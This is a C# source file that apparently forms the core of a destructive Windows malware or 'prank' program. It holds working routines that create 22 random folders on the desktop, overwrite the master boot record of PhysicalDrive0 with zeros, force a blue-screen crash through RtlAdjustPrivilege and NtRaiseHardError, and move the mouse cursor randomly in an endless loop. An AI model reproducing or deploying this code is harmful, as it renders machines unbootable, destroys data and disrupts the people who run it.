using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace CluttAncient
{
    internal class Anything
    {
        public static void CreateRandomFolder()
        {
            Random rn = new Random();
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            for (int i = 0; i < 22; ++i)
            {
                string namaFolder = $"{rn.Next(255)}CCC";
                string combination = Path.Combine(desktop, namaFolder);
                Directory.CreateDirectory(combination);
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint RtlAdjustPrivilege(
            int Privilege,
            bool Enable,
            bool CurrentThread,
            out bool Enabled);

        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        //dwDesiredAccess
        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        //dwShareMode
        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);
        internal static void mbr()          // be careful it bites!
        {
            var MbrData = new byte[MbrSize];
            var hDevice = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareWrite | FileShareRead, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
            WriteFile(hDevice, MbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
            CloseHandle(hDevice);
            
        }
        internal static void BSOD()
        {
            bool t1;
            try
            {
                RtlAdjustPrivilege(19, true, false, out t1);
                uint response;
                NtRaiseHardError(0xC000001A, 0, 0, IntPtr.Zero, 6, out response);
            } catch (Exception unableToTrigger)
            {
                MessageBox.Show($"{unableToTrigger} \nPlease reboot manually.", "Cannot Trigger BSOD", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static void MoveCursor()
        {
            while (true)
            {
                Random r = new Random();
                int x = r.Next(0, 1920);
                int y = r.Next(0, 1080);

                Cursor.Position = new System.Drawing.Point(x, y);

                Thread.Sleep(1);
            }
        }
    }
}
